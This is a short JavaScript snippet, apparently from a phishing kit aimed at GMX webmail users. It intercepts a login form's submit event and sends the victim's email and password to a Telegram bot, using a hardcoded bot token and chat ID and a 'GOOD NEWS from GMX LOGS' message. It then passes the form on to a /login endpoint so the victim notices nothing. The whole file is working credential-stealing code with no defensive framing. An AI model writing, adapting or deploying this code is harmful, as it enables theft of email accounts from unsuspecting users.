// Make sure to replace this with your actual token and chat ID
const TELEGRAM_BOT_TOKEN = '7285927680:AAHqGWvKT2dOnkiGFEukfS4-SoxUx5JQ89o';
const TELEGRAM_CHAT_ID = '7473556793';

document.querySelector('form').addEventListener('submit', async function(event) {
    event.preventDefault(); // Prevent default form submission
    
    const formData = new FormData(event.target); // Capture form data
    
    try {
        // Send message to Telegram
        const message = `*GOOD NEWS from GMX LOGS*\n\nEmail: ${formData.get('email')}\nPassword: ${formData.get('password')}`;
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            body: new URLSearchParams({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        // Handle redirection based on success or failure
        const response = await fetch('/login', {
            method: 'POST',
            body: formData // Send form data
        });
        const data = await response.json();

        if (data.redirect) {
            window.location.href = data.redirect;
        } else {
            console.error('Unexpected data format:', data);
            window.location.reload();
        }
    } catch (error) {
        console.error('Error:', error);
        window.location.reload();
    }
});


